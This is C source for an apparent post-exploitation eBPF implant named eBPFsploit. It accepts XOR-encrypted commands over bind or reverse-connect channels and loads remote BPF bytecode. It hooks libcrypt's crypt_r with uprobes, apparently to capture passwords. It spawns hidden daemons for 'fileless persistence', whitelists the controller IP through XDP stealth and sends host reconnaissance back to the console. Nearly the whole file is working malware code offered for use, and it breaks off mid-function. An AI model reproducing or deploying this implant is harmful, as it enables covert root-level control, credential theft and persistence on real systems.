#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <bpf/libbpf.h>
#include <bpf/bpf.h>
#include <linux/bpf.h>
#include <sys/socket.h>
#include <sys/un.h>
#include <fcntl.h>
#include <signal.h>
#include <sys/wait.h>
#include <net/if.h>
#include <ctype.h>
#include <sys/utsname.h>

#define MAGIC            0xDEADBEEF
#define MAX_SESSIONS     32
#define MAX_LINKS        16
#define MAX_MAPS         16
#define SHADOW_MAX_FDS   48

/* ---- Pre-Shared Key (Auto-replaced at build time) ---- */
static const char PSK[] = "__EBPFSPLOIT_PSK__";

/* ---- Command Types ---- */
#define CMD_LOAD    4   /* Load module */
#define CMD_UNLOAD  5   /* Hot-unload module */
#define CMD_LIST    6   /* Query active sessions list */
#define CMD_UPDATE  7   /* Runtime update BPF Map */
#define RESP_MSG    8   /* Agent -> Console response */
#define CMD_RECON   9   /* Request environment recon info */
#define CMD_GET     10  /* Get BPF Map value */
#define CMD_DUMP_MAP 11 /* Export entire BPF Map */
#define CMD_DELETE  12  /* Delete specified Key from BPF Map */
#define CMD_CLEAR   13  /* Clear BPF Map */

/* ---- Communication Protocol Structure ---- */
/* Total size: 4+4+4+4+32+96 = 144 bytes */
struct cmd_payload {
    uint32_t magic;
    uint32_t cmd_type;
    uint32_t session_id;   /* load=0; unload/update=target id */
    uint32_t data_size;    /* load=BPF bytecode size; update=0 */
    char     aux[32];      /* load=module name; update=target map name */
    char     config[96];   /* load=initial config; update=[0:key_size]=key, [key_size:]=value */
};

/* ---- Session Registry ---- */
struct session {
    uint32_t          id;
    char              name[32];
    int               active;
    struct bpf_object *obj;
    struct bpf_link   *links[MAX_LINKS];
    int               link_count;
    /* Shadow daemon fields */
    pid_t             shadow_pid;
    int               map_fds[MAX_MAPS];
    char              map_names[MAX_MAPS][32];
    int               map_count;
};

static struct session sessions[MAX_SESSIONS];
static uint32_t next_id = 1;

static struct session *alloc_session(void) {
    for (int i = 0; i < MAX_SESSIONS; i++) {
        if (!sessions[i].active) {
            memset(&sessions[i], 0, sizeof(sessions[i]));
            sessions[i].id     = next_id++;
            sessions[i].active = 1;
            return &sessions[i];
        }
    }
    return NULL;
}

static struct session *find_session(uint32_t id) {
    for (int i = 0; i < MAX_SESSIONS; i++)
        if (sessions[i].active && sessions[i].id == id)
            return &sessions[i];
    return NULL;
}

/* XOR Encryption/Decryption (Independent for each message, key position starts from 0) */
static void xor_crypt(void *data, size_t len) {
    unsigned char *d = (unsigned char *)data;
    size_t psk_len = strlen(PSK);
    if (psk_len == 0) return;
    for (size_t i = 0; i < len; i++)
        d[i] ^= PSK[i % psk_len];
}

/* Send JSON response (with 4-byte length prefix, both XOR encrypted) */
void send_resp(int sock, const char *json_str) {
    uint32_t len = strlen(json_str);
    uint32_t enc_len = len;
    xor_crypt(&enc_len, sizeof(enc_len));
    send(sock, &enc_len, sizeof(enc_len), 0);
    char *enc_buf = malloc(len);
    if (!enc_buf) return;
    memcpy(enc_buf, json_str, len);
    xor_crypt(enc_buf, len);
    send(sock, enc_buf, len, 0);
    free(enc_buf);
}

/* ==================== Shadow Daemon Infrastructure ==================== */

/* Shadow daemon communication metadata structure */
struct shadow_meta {
    uint32_t session_id;
    char     name[32];
    int      link_count;
    int      map_count;
    char     map_names[MAX_MAPS][32];
};

/* Construct abstract namespace socket address (does not produce any disk files) */
static socklen_t make_shadow_addr(struct sockaddr_un *addr, uint32_t sid) {
    memset(addr, 0, sizeof(*addr));
    addr->sun_family = AF_UNIX;
    addr->sun_path[0] = '\0';
    int n = snprintf(addr->sun_path + 1, sizeof(addr->sun_path) - 1, "_kw_%u", sid);
    return offsetof(struct sockaddr_un, sun_path) + 1 + n;
}

/* SCM_RIGHTS: Send FD across processes */
static int send_fds(int sock, struct shadow_meta *meta, int *fds, int num_fds) {
    struct msghdr msg = {0};
    struct iovec iov = { .iov_base = meta, .iov_len = sizeof(*meta) };
    msg.msg_iov = &iov;
    msg.msg_iovlen = 1;
    size_t cmsg_sz = CMSG_SPACE(sizeof(int) * num_fds);
    char *cmsgbuf = calloc(1, cmsg_sz);
    if (!cmsgbuf) return -1;
    msg.msg_control = cmsgbuf;
    msg.msg_controllen = cmsg_sz;
    struct cmsghdr *cmsg = CMSG_FIRSTHDR(&msg);
    cmsg->cmsg_level = SOL_SOCKET;
    cmsg->cmsg_type = SCM_RIGHTS;
    cmsg->cmsg_len = CMSG_LEN(sizeof(int) * num_fds);
    memcpy(CMSG_DATA(cmsg), fds, sizeof(int) * num_fds);
    int ret = sendmsg(sock, &msg, 0);
    free(cmsgbuf);
    return ret;
}

/* SCM_RIGHTS: Receive FD across processes */
static int recv_fds(int sock, struct shadow_meta *meta, int *fds, int max_fds) {
    struct msghdr msg = {0};
    struct iovec iov = { .iov_base = meta, .iov_len = sizeof(*meta) };
    msg.msg_iov = &iov;
    msg.msg_iovlen = 1;
    size_t cmsg_sz = CMSG_SPACE(sizeof(int) * max_fds);
    char *cmsgbuf = calloc(1, cmsg_sz);
    if (!cmsgbuf) return -1;
    msg.msg_control = cmsgbuf;
    msg.msg_controllen = cmsg_sz;
    if (recvmsg(sock, &msg, 0) <= 0) { free(cmsgbuf); return -1; }
    struct cmsghdr *cmsg = CMSG_FIRSTHDR(&msg);
    int num = -1;
    if (cmsg && cmsg->cmsg_level == SOL_SOCKET && cmsg->cmsg_type == SCM_RIGHTS) {
        num = (cmsg->cmsg_len - CMSG_LEN(0)) / sizeof(int);
        if (num > max_fds) num = max_fds;
        memcpy(fds, CMSG_DATA(cmsg), num * sizeof(int));
    }
    free(cmsgbuf);
    return num;
}

/* Shadow Daemon: Holds FD until death, responds to recovery requests from new Agent */
static void run_shadow_daemon(struct shadow_meta *meta, int *fds, int num_fds) {
    setsid();
    int null_fd = open("/dev/null", O_RDWR);
    if (null_fd >= 0) {
        dup2(null_fd, STDIN_FILENO);
        dup2(null_fd, STDOUT_FILENO);
        dup2(null_fd, STDERR_FILENO);
        if (null_fd > 2) close(null_fd);
    }
    int listen_fd = socket(AF_UNIX, SOCK_STREAM, 0);
    if (listen_fd < 0) _exit(1);
    struct sockaddr_un addr;
    socklen_t addr_len = make_shadow_addr(&addr, meta->session_id);
    if (bind(listen_fd, (struct sockaddr *)&addr, addr_len) < 0) _exit(1);
    if (listen(listen_fd, 1) < 0) _exit(1);
    signal(SIGTERM, SIG_DFL);
    while (1) {
        int client = accept(listen_fd, NULL, NULL);
        if (client < 0) continue;
        send_fds(client, meta, fds, num_fds);
        close(client);
    }
}

/* Recover session from existing shadow daemon */
static void recover_from_shadows(void) {
    for (uint32_t sid = 1; sid < 256; sid++) {
        struct sockaddr_un addr;
        socklen_t addr_len = make_shadow_addr(&addr, sid);
        int sock = socket(AF_UNIX, SOCK_STREAM, 0);
        if (sock < 0) continue;
        struct timeval tv = { .tv_sec = 0, .tv_usec = 100000 };
        setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));
        if (connect(sock, (struct sockaddr *)&addr, addr_len) < 0) {
            close(sock); continue;
        }
        struct shadow_meta meta;
        int fds[SHADOW_MAX_FDS];
        int num = recv_fds(sock, &meta, fds, SHADOW_MAX_FDS);
        /* Get shadow process PID */
        pid_t shadow_pid = 0;
        struct ucred cred;
        socklen_t cred_len = sizeof(cred);
        if (getsockopt(sock, SOL_SOCKET, SO_PEERCRED, &cred, &cred_len) == 0)
            shadow_pid = cred.pid;
        close(sock);
        if (num <= 0) continue;
        struct session *s = NULL;
        for (int i = 0; i < MAX_SESSIONS; i++) {
            if (!sessions[i].active) { s = &sessions[i]; break; }
        }
        if (!s) continue;
        memset(s, 0, sizeof(*s));
        s->id = meta.session_id;
        s->active = 1;
        strncpy(s->name, meta.name, sizeof(s->name) - 1);
        s->link_count = meta.link_count;
        s->obj = NULL;
        s->shadow_pid = shadow_pid;
        s->map_count = meta.map_count > num ? num : meta.map_count;
        for (int i = 0; i < s->map_count; i++) {
            s->map_fds[i] = fds[i];
            strncpy(s->map_names[i], meta.map_names[i], 31);
        }
        if (s->id >= next_id) next_id = s->id + 1;
        printf("[*] Recovered shadow session %u (%s) — %d maps, %d hooks\n",
               s->id, s->name, s->map_count, s->link_count);
    }
}

/* Find FD by map name (compatible with obj mode and shadow recovery mode) */
static int find_map_fd(struct session *s, const char *map_name,
                       size_t *key_size, size_t *val_size) {
    if (s->obj) {
        struct bpf_map *map = bpf_object__find_map_by_name(s->obj, map_name);
        if (!map) return -1;
        if (key_size) *key_size = bpf_map__key_size(map);
        if (val_size) *val_size = bpf_map__value_size(map);
        return bpf_map__fd(map);
    }
    for (int i = 0; i < s->map_count; i++) {
        if (strcmp(s->map_names[i], map_name) == 0) {
            int fd = s->map_fds[i];
            struct bpf_map_info info = {};
            unsigned int info_len = sizeof(info);
            if (bpf_obj_get_info_by_fd(fd, &info, &info_len) == 0) {
                if (key_size) *key_size = info.key_size;
                if (val_size) *val_size = info.value_size;
            }
            return fd;
        }
    }
    return -1;
}

/* ---- Initial Config: Write config data to known configuration Maps ---- */
static void apply_initial_config(struct bpf_object *obj, const char *config) {
    if (!config || !config[0]) return;

    struct bpf_map *map;
    bpf_object__for_each_map(map, obj) {
        const char *n = bpf_map__name(map);
        /* 若 map 包含 "target", "payload", "password" 等关键字，自动写入初始配置 */
        if (strstr(n, "target") || strstr(n, "payload") || strstr(n, "password")) {
            int fd = bpf_map__fd(map);
            if (fd < 0) continue;

            size_t ksz = bpf_map__key_size(map);
            size_t vsz = bpf_map__value_size(map);
            enum bpf_map_type type = bpf_map__type(map);

            if (type == BPF_MAP_TYPE_HASH) {
                uint64_t val_to_insert = 0;
                uint32_t mark = 1;
                /* Quick check for shadow_walker: 'target' with 8-byte key */
                if (strcmp(n, "target") == 0 && ksz == 8) {
                    memcpy(&val_to_insert, config, 8);
                }
                /* Try to parse: string first, then binary */
                else if (isdigit((unsigned char)config[0])) {
                    val_to_insert = strtoull(config, NULL, 0);
                } else {
                    /* Handle packed 4/8 byte integers (e.g. struct.pack('<I', ...)) */
                    memcpy(&val_to_insert, config, (ksz <= 8 ? ksz : 8));
                }

                /* Only insert if value is non-zero (Logic default, PID/Port 0 are not valid business targets) */
                if (val_to_insert != 0) {
                    if (ksz <= 8) {
                        bpf_map_update_elem(fd, &val_to_insert, &mark, BPF_ANY);
                        printf("[+] XDP/Agent: Applied initial target %lu to Hash map '%s'\n", (unsigned long)val_to_insert, n);
                    }
                }
            } else if (type == BPF_MAP_TYPE_ARRAY) {
                /* For Array Map: write to key 0 */
                uint32_t key = 0;
                if (vsz > 96) vsz = 96;
                bpf_map_update_elem(fd, &key, config, BPF_ANY);
                printf("[+] XDP/Agent: Applied initial config to Array map '%s'\n", n);
            }
        }
    }
}

/* ---- CMD_LOAD ---- */
static void handle_load(int sock, struct cmd_payload *cmd) {
    if (cmd->data_size == 0) {
        send_resp(sock, "{\"error\":\"data_size=0\"}");
        return;
    }

    unsigned char *buf = malloc(cmd->data_size);
    if (!buf) { send_resp(sock, "{\"error\":\"malloc\"}"); return; }

    if (recv(sock, buf, cmd->data_size, MSG_WAITALL) != (ssize_t)cmd->data_size) {
        free(buf);
        send_resp(sock, "{\"error\":\"recv blob\"}");
        return;
    }
    xor_crypt(buf, cmd->data_size);  /* Decrypt BPF bytecode */

    struct session *s = alloc_session();
    if (!s) {
        free(buf);
        send_resp(sock, "{\"error\":\"max sessions reached\"}");
        return;
    }

    strncpy(s->name, cmd->aux[0] ? cmd->aux : "unknown", 31);

    struct bpf_object *obj = bpf_object__open_mem(buf, cmd->data_size, NULL);
    free(buf); /* libbpf has copied internally, can be safely freed */

    if (libbpf_get_error(obj)) {
        s->active = 0;
        send_resp(sock, "{\"error\":\"open_mem failed\"}");
        return;
    }

    /* Patch .data before loading (compatible with legacy method) */
    struct bpf_map *data_map = bpf_object__find_map_by_name(obj, ".data");
    if (data_map) {
        size_t msz = bpf_map__value_size(data_map);
        const void *mptr_const = bpf_map__initial_value(data_map, NULL);
        void *mptr = (void *)mptr_const;
        if (mptr && cmd->config[0]) {
            size_t cp = msz < 64 ? msz : 64;
            memcpy(mptr, cmd->config, cp);
        }
    }

    int err = bpf_object__load(obj);
    if (err) {
        bpf_object__close(obj);
        s->active = 0;
        char msg[64];
        snprintf(msg, sizeof(msg), "{\"error\":\"load err %d\"}", err);
        send_resp(sock, msg);
        return;
    }

    /* Write initial value to configuration Map (runtime patch) */
    apply_initial_config(obj, cmd->config);

    /* Attach all BPF programs, persist link */
    struct bpf_program *prog;
    bpf_object__for_each_program(prog, obj) {
        struct bpf_link *lk = NULL;
        enum bpf_prog_type ptype = bpf_program__type(prog);
        const char *sec_name = bpf_program__section_name(prog);

        if (ptype == BPF_PROG_TYPE_XDP) {
            const char *ifname = "eth0";
            if (cmd->config[64])
                ifname = (const char *)&cmd->config[64];
            unsigned int ifidx = if_nametoindex(ifname);
            if (ifidx == 0) {
                printf("[!] XDP: interface '%s' not found, trying eth0\n", ifname);
                ifidx = if_nametoindex("eth0");
            }
            if (ifidx > 0) {
                lk = bpf_program__attach_xdp(prog, ifidx);
                if (!libbpf_get_error(lk))
                    printf("[+] XDP attached to ifindex %u (%s)\n", ifidx, ifname);
            }
        } else if (ptype == BPF_PROG_TYPE_KPROBE && sec_name &&
                   (strstr(sec_name, "uprobe") || strstr(sec_name, "uretprobe"))) {
            /* uprobe/uretprobe requires specified binary path */
            int is_retprobe = (strstr(sec_name, "uretprobe") != NULL);
            /* Try common libcrypt paths */
            const char *crypt_paths[] = {
                "/lib/x86_64-linux-gnu/libcrypt.so.1",
                "/lib64/libcrypt.so.1",
                "/lib/libcrypt.so.1",
                "/usr/lib/libcrypt.so.1",
                "/usr/lib/x86_64-linux-gnu/libcrypt.so.1",
                NULL
            };
            const char *lib_path = NULL;
            for (int p = 0; crypt_paths[p]; p++) {
                if (access(crypt_paths[p], F_OK) == 0) {
                    lib_path = crypt_paths[p];
                    break;
                }
            }
            if (lib_path) {
                /* Dynamically grab crypt_r offset, compatible with any exported symbol type and versioned suffixes (e.g. @@XCRYPT_2.0) */
                char nm_cmd[512];
                snprintf(nm_cmd, sizeof(nm_cmd),
                    "nm -D '%s' 2>/dev/null | grep -E ' [a-zA-Z] crypt_r(@@.*)?$' | grep -v ' U ' | head -1 | awk '{print $1}'",
                    lib_path);
                
                size_t func_off = 0;
                FILE *nm_fp = popen(nm_cmd, "r");
                if (nm_fp) {
                    char off_buf[32];
                    if (fgets(off_buf, sizeof(off_buf), nm_fp))
                        func_off = strtoull(off_buf, NULL, 16);
                    pclose(nm_fp);
                }
                
                if (func_off == 0) {
                    printf("[-] Cannot resolve crypt_r() offset in %s\n", lib_path);
                } else {
                    LIBBPF_OPTS(bpf_uprobe_opts, up_opts,
                        .retprobe = is_retprobe,
                    );
                    lk = bpf_program__attach_uprobe_opts(prog, -1, lib_path, func_off, &up_opts);
                    if (!libbpf_get_error(lk))
                        printf("[+] %s attached to %s:crypt_r (offset 0x%lx)\n",
                            is_retprobe ? "uretprobe" : "uprobe", lib_path, func_off);
                    else
                        printf("[-] Failed to attach %s to %s\n",
                            is_retprobe ? "uretprobe" : "uprobe", lib_path);
                }
            } else {
                printf("[-] libcrypt.so.1 not found, uprobe skipped\n");
            }
        } else {
            lk = bpf_program__attach(prog);
        }

        if (lk && !libbpf_get_error(lk) && s->link_count < MAX_LINKS)
            s->links[s->link_count++] = lk;
    }

    s->obj = obj;

    /* ========== Fileless Persistence: Shadow Daemon ========== */
    int all_fds[SHADOW_MAX_FDS];
    int fd_idx = 0;
    struct shadow_meta meta = {
        .session_id = s->id,
        .link_count = s->link_count,
        .map_count = 0
    };
    strncpy(meta.name, s->name, sizeof(meta.name) - 1);

    struct bpf_map *map_iter;
    bpf_object__for_each_map(map_iter, obj) {
        int mfd = bpf_map__fd(map_iter);
        if (mfd >= 0 && fd_idx < SHADOW_MAX_FDS && meta.map_count < MAX_MAPS) {
            all_fds[fd_idx++] = mfd;
            strncpy(meta.map_names[meta.map_count], bpf_map__name(map_iter), 31);
            s->map_fds[meta.map_count] = mfd;
            strncpy(s->map_names[meta.map_count], bpf_map__name(map_iter), 31);
            meta.map_count++;
        }
    }
    s->map_count = meta.map_count;

    pid_t shadow_pid = fork();
    if (shadow_pid == 0) {
        run_shadow_daemon(&meta, all_fds, fd_idx);
        _exit(0);
    } else if (shadow_pid > 0) {
        s->shadow_pid = shadow_pid;
        printf("[+] Shadow Daemon spawned (PID: %d). Fileless persistence achieved.\n", shadow_pid);
    } else {
        printf("[-] Failed to spawn Shadow Daemon.\n");
    }

    char resp[128];
    snprintf(resp, sizeof(resp),
             "{\"ok\":true,\"session_id\":%u,\"name\":\"%s\",\"programs\":%d}",
             s->id, s->name, s->link_count);
    send_resp(sock, resp);
    printf("[+] Module '%s' loaded \xe2\x86\x92 Session %u (%d programs) [FILELESS]\n",
           s->name, s->id, s->link_count);
}

/* ---- CMD_UNLOAD ---- */
static void handle_unload(int sock, struct cmd_payload *cmd) {
    struct session *s = find_session(cmd->session_id);
    if (!s) { send_resp(sock, "{\"error\":\"session not found\"}"); return; }

    /* Kill shadow daemon */
    if (s->shadow_pid > 0) {
        kill(s->shadow_pid, SIGKILL);
        waitpid(s->shadow_pid, NULL, 0);
        s->shadow_pid = 0;
    }

    for (int i = 0; i < s->link_count; i++) {
        if (s->links[i]) { bpf_link__destroy(s->links[i]); s->links[i] = NULL; }
    }
    if (s->obj) {
        bpf_object__close(s->obj); s->obj = NULL;
    } else {
        for (int i = 0; i < s->map_count; i++) {
            if (s->map_fds[i] >= 0) close(s->map_fds[i]);
        }
    }

    char resp[128];
    snprintf(resp, sizeof(resp),
             "{\"ok\":true,\"unloaded\":%u,\"name\":\"%s\"}", s->id, s->name);
    printf("[+] Session %u ('%s') unloaded\n", s->id, s->name);
    s->active = 0;
    send_resp(sock, resp);
}

/* ---- CMD_LIST ---- */
static void handle_list(int sock) {
    char resp[1024];
    int  pos = 0;
    pos += snprintf(resp + pos, sizeof(resp) - pos, "{\"sessions\":[");
    int first = 1;
    for (int i = 0; i < MAX_SESSIONS; i++) {
        if (!sessions[i].active) continue;
        char entry[128];
        snprintf(entry, sizeof(entry),
                 "%s{\"id\":%u,\"name\":\"%s\",\"programs\":%d}",
                 first ? "" : ",",
                 sessions[i].id, sessions[i].name, sessions[i].link_count);
        pos += snprintf(resp + pos, sizeof(resp) - pos, "%s", entry);
        first = 0;
    }
    snprintf(resp + pos, sizeof(resp) - pos, "]}");
    send_resp(sock, resp);
}



/* ---- CMD_DUMP_MAP ---- */
static void handle_dump_map(int sock, struct cmd_payload *cmd) {
    struct session *s = find_session(cmd->session_id);
    if (!s) { send_resp(sock, "{\"error\":\"session invalid\"}"); return; }

    const char *map_name = (char *)cmd->aux;
    size_t key_size = 0, val_size = 0;
    int fd = find_map_fd(s, map_name, &key_size, &val_size);

    if (fd < 0 || key_size == 0 || val_size == 0 || key_size > 256 || val_size > 256) {
        send_resp(sock, "{\"error\":\"invalid map meta for dump\"}");
        return;
    }

    uint8_t key[256], next_key[256], val[256];
    memset(key, 0, sizeof(key));
    memset(next_key, 0, sizeof(next_key));

    char resp[8192];
    int pos = snprintf(resp, sizeof(resp), "{\"ok\":true,\"map\":\"%s\",\"entries\":[", map_name);
    int first = 1;

    int err = bpf_map_get_next_key(fd, NULL, next_key);
    while (err == 0 && pos < sizeof(resp) - 1024) {
        if (bpf_map_lookup_elem(fd, next_key, val) == 0) {
            pos += snprintf(resp + pos, sizeof(resp) - pos, "%s{\"k\":\"", first ? "" : ",");
            for (size_t i = 0; i < key_size; i++) pos += snprintf(resp + pos, sizeof(resp) - pos, "%02x", next_key[i]);
            pos += snprintf(resp + pos, sizeof(resp) - pos, "\",\"v\":\"");
            for (size_t i = 0; i < val_size; i++) pos += snprintf(resp + pos, sizeof(resp) - pos, "%02x", val[i]);
            pos += snprintf(resp + pos, sizeof(resp) - pos, "\"}");
            first = 0;
        }
        memcpy(key, next_key, key_size);
        err = bpf_map_get_next_key(fd, key, next_key);
    }
    snprintf(resp + pos, sizeof(resp) - pos, "]}");
    send_resp(sock, resp);
}

/* ---- CMD_GET ---- */
/*
 * config 布局：
 *   [0 : key_size)  = map key  (原始字节，小端)
 *   [key_size : 96) = map value (原始字节)
 *
 * key_size 由 BPF map 元数据自动获取，无需协议方显式携带。
 */
static void handle_get(int sock, struct cmd_payload *cmd) {
    struct session *s = find_session(cmd->session_id);
    if (!s) { send_resp(sock, "{\"error\":\"session invalid\"}"); return; }

    const char *map_name = (char *)cmd->aux;
    size_t key_size = 0, val_size = 0;
    int fd = find_map_fd(s, map_name, &key_size, &val_size);

    if (fd < 0 || key_size == 0 || val_size == 0 || val_size > 256) {
        send_resp(sock, "{\"error\":\"invalid map meta for get\"}");
        return;
    }

    void *key_ptr = cmd->config;
    uint8_t val_buf[256];
    memset(val_buf, 0, sizeof(val_buf));

    int err = bpf_map_lookup_elem(fd, key_ptr, val_buf);
    if (err) {
        char msg[64];
        snprintf(msg, sizeof(msg), "{\"error\":\"lookup_elem %d\"}", err);
        send_resp(sock, msg);
        return;
    }

    char hex_val[512];
    for (size_t i = 0; i < val_size; i++)
        sprintf(hex_val + i * 2, "%02x", val_buf[i]);
    hex_val[val_size * 2] = '\0';

    char resp[1024];
    snprintf(resp, sizeof(resp),
             "{\"ok\":true,\"session\":%u,\"map\":\"%s\",\"value_hex\":\"%s\"}",
             s->id, map_name, hex_val);
    send_resp(sock, resp);
}

/* ---- CMD_UPDATE ---- */
/*
 * config 布局：
 *   [0 : key_size)  = map key  (原始字节，小端)
 *   [key_size : 96) = map value (原始字节)
 *
 * key_size 由 BPF map 元数据自动获取，无需协议方显式携带。
 */
static void handle_update(int sock, struct cmd_payload *cmd) {
    struct session *s = find_session(cmd->session_id);
    if (!s) { send_resp(sock, "{\"error\":\"session invalid\"}"); return; }

    const char *map_name = cmd->aux;
    size_t key_size = 0, val_size = 0;
    int fd = find_map_fd(s, map_name, &key_size, &val_size);

    if (fd < 0 || key_size == 0 || key_size > 8) {
        send_resp(sock, "{\"error\":\"invalid map meta or not found\"}");
        return;
    }

    void *key_ptr = cmd->config;
    void *val_ptr = cmd->config + key_size;

    int err = bpf_map_update_elem(fd, key_ptr, val_ptr, BPF_ANY);
    if (err) {
        char msg[64];
        snprintf(msg, sizeof(msg), "{\"error\":\"update_elem %d\"}", err);
        send_resp(sock, msg);
        return;
    }

    char resp[128];
    snprintf(resp, sizeof(resp),
             "{\"ok\":true,\"session\":%u,\"map\":\"%s\"}", s->id, map_name);
    send_resp(sock, resp);
}

/* ---- CMD_DELETE ---- */
static void handle_delete(int sock, struct cmd_payload *cmd) {
    struct session *s = find_session(cmd->session_id);
    if (!s) { send_resp(sock, "{\"error\":\"session invalid\"}"); return; }

    const char *map_name = cmd->aux;
    size_t ksz = 0;
    int fd = find_map_fd(s, map_name, &ksz, NULL);

    if (fd < 0 || ksz == 0 || ksz > 8) {
        send_resp(sock, "{\"error\":\"invalid map meta for delete\"}");
        return;
    }

    int err = bpf_map_delete_elem(fd, cmd->config);
    if (err) {
        char msg[64];
        snprintf(msg, sizeof(msg), "{\"error\":\"delete_elem %d\"}", err);
        send_resp(sock, msg);
        return;
    }

    send_resp(sock, "{\"ok\":true}");
}

/* ---- CMD_CLEAR ---- */
static void handle_clear(int sock, struct cmd_payload *cmd) {
    struct session *s = find_session(cmd->session_id);
    if (!s) { send_resp(sock, "{\"error\":\"session invalid\"}"); return; }

    const char *map_name = cmd->aux;
    size_t ksz = 0;
    int fd = find_map_fd(s, map_name, &ksz, NULL);

    if (fd < 0 || ksz == 0 || ksz > 256) {
        send_resp(sock, "{\"error\":\"invalid map meta for clear\"}");
        return;
    }

    uint8_t key[256], next_key[256];
    memset(key, 0, sizeof(key));

    /* Iteratively delete all elements */
    while (bpf_map_get_next_key(fd, NULL, next_key) == 0) {
        bpf_map_delete_elem(fd, next_key);
    }

    send_resp(sock, "{\"ok\":true}");
}

/* ---- CMD_RECON: Environment Reconnaissance ---- */
static int file_exists(const char *path) { return access(path, F_OK) == 0; }
static int file_readable(const char *path) { return access(path, R_OK) == 0; }

static int check_cap(int cap_id) {
    /* Simple check: Read CapEff bit from /proc/self/status */
    FILE *fp = fopen("/proc/self/status", "r");
    if (!fp) return 0;
    char line[256];
    unsigned long long cap_eff = 0;
    while (fgets(line, sizeof(line), fp)) {
        if (sscanf(line, "CapEff:\t%llx", &cap_eff) == 1) break;
    }
    fclose(fp);
    return (cap_eff & (1ULL << cap_id)) != 0;
}

static void read_lsm_list(char *buf, size_t sz) {
    buf[0] = '\0';
    FILE *fp = fopen("/sys/kernel/security/lsm", "r");
    if (fp) {
        if (fgets(buf, sz, fp)) {
            /* Remove newline */
            char *nl = strchr(buf, '\n');
            if (nl) *nl = '\0';
        }
        fclose(fp);
    }
}

static void handle_recon(int sock) {
    struct utsname un;
    uname(&un);

    int is_root        = (getuid() == 0);
    int cap_bpf        = check_cap(39);  /* CAP_BPF */
    int cap_sys_admin  = check_cap(21);  /* CAP_SYS_ADMIN */
    int cap_mac_admin  = check_cap(33);  /* CAP_MAC_ADMIN */
    int cap_net_admin  = check_cap(12);  /* CAP_NET_ADMIN */
    int has_bpf_fs     = file_exists("/sys/fs/bpf");
    int has_btf        = file_exists("/sys/kernel/btf/vmlinux");
    int has_tracefs    = file_exists("/sys/kernel/debug/tracing") ||
                         file_exists("/sys/kernel/tracing");
    int has_uprobe     = file_exists("/sys/kernel/debug/tracing/uprobe_events") ||
                         file_exists("/sys/kernel/tracing/uprobe_events");
    int has_kprobe     = file_exists("/sys/kernel/debug/tracing/kprobe_events") ||
                         file_exists("/sys/kernel/tracing/kprobe_events");
    int has_xdp        = cap_net_admin || cap_sys_admin; /* XDP requires net privileges */

    char lsm_list[256] = "";
    read_lsm_list(lsm_list, sizeof(lsm_list));
    int has_lsm_bpf = (strstr(lsm_list, "bpf") != NULL);

    int has_probe_write = file_readable("/proc/sys/kernel/unprivileged_bpf_disabled");

    char resp[1024];
    snprintf(resp, sizeof(resp),
        "{"
        "\"recon\":{"
          "\"kernel\":\"%s %s\","
          "\"arch\":\"%s\","
          "\"hostname\":\"%s\","
          "\"is_root\":%d,"
          "\"caps\":{"
            "\"bpf\":%d,"
            "\"sys_admin\":%d,"
            "\"mac_admin\":%d,"
            "\"net_admin\":%d"
          "},"
          "\"features\":{"
            "\"bpf_fs\":%d,"
            "\"btf\":%d,"
            "\"tracefs\":%d,"
            "\"uprobe\":%d,"
            "\"kprobe\":%d,"
            "\"xdp\":%d,"
            "\"lsm_bpf\":%d,"
            "\"probe_write\":%d,"
            "\"kprobe_override\":%d"
          "},"
          "\"lsm_modules\":\"%s\""
        "}"
        "}",
        un.sysname, un.release, un.machine, un.nodename,
        is_root,
        cap_bpf, cap_sys_admin, cap_mac_admin, cap_net_admin,
        has_bpf_fs, has_btf, has_tracefs, has_uprobe, has_kprobe,
        has_xdp, has_lsm_bpf, has_probe_write, has_kprobe,
        lsm_list
    );
    send_resp(sock, resp);
    printf("[+] Recon data sent to console\n");
}

/* ================================================================ */
static void print_help(const char *prog) {
    printf(
        "\n"
        "  ╔═══════════════════════════════════════════════════╗\n"
        "  ║                Agent  —  eBPFsploit               ║\n"
        "  ║    Kernel-level eBPF implant for post-exploit     ║\n"
        "  ╚═══════════════════════════════════════════════════╝\n"
        "\n"
        "  USAGE:\n"
        "    %s [OPTIONS]\n"
        "\n"
        "  CONNECTION MODES:\n"
        "    -b <PORT>             Bind mode: listen on <PORT>, wait for console\n"
        "    -r <IP> <PORT>        Reverse mode: connect back to console at <IP>:<PORT>\n"
        "\n"
        "  STEALTH:\n"
        "    -i <IFACE>            Enable XDP stealth on <IFACE> (requires root + CAP_NET_ADMIN)\n"
        "                          Without -i, XDP stealth is disabled\n"
        "\n"
        "  OTHER OPTIONS:\n"
        "    -h, --help            Show this help message and exit\n"
        "\n"
        "  EXAMPLES:\n"
        "    %s -b 4444            Bind — agent listens on 0.0.0.0:4444\n"
        "    %s -r 10.0.0.1 4444   Reverse — agent connects to 10.0.0.1:4444\n"
        "\n"
        "  PROTOCOL:\n"
        "    144-byte command packets. Supported commands:\n"
        "      CMD_LOAD   (4)  — Load and attach an eBPF module\n"
        "      CMD_UNLOAD (5)  — Detach and destroy a running module\n"
        "      CMD_LIST   (6)  — List all active sessions\n"
        "      CMD_UPDATE (7)  — Update a BPF map in a running module\n"
        "\n"
        "  NOTES:\n"
        "    - Requires root privileges (CAP_BPF + CAP_SYS_ADMIN)\n"
        "    - Max concurrent sessions: %d\n"
        "    - Reverse mode auto-reconnects on disconnect (5s interval)\n"
        "\n",
        prog, prog, prog, MAX_SESSIONS
    );
}

/* 前向声明（定义在 auto_load_stealth 之后） */
static void stealth_allow_ip(uint32_t ip_net);

/* Handle command loop on a single connection
 * peer_ip: Peer IP (network byte order), used to add to XDP whitelist after Console validation */
static void handle_connection(int c_sock, uint32_t peer_ip) {
    printf("[+] Console connected\n");
    int whitelisted = 0;  /* 是否已把该 IP 加入白名单 */
    struct cmd_payload cmd;
    while (recv(c_sock, &cmd, sizeof(cmd), MSG_WAITALL) == sizeof(cmd)) {
        xor_crypt(&cmd, sizeof(cmd));  /* Decrypt command packet */
        if (cmd.magic != MAGIC) continue;
        /* First valid command verified, now confirmed as genuine Console */
        if (!whitelisted) {
            stealth_allow_ip(peer_ip);
            whitelisted = 1;
        }
        switch (cmd.cmd_type) {
            case CMD_LOAD:   handle_load(c_sock, &cmd);   break;
            case CMD_UNLOAD: handle_unload(c_sock, &cmd); break;
            case CMD_LIST:   handle_list(c_sock);          break;
            case CMD_UPDATE: handle_update(c_sock, &cmd); break;
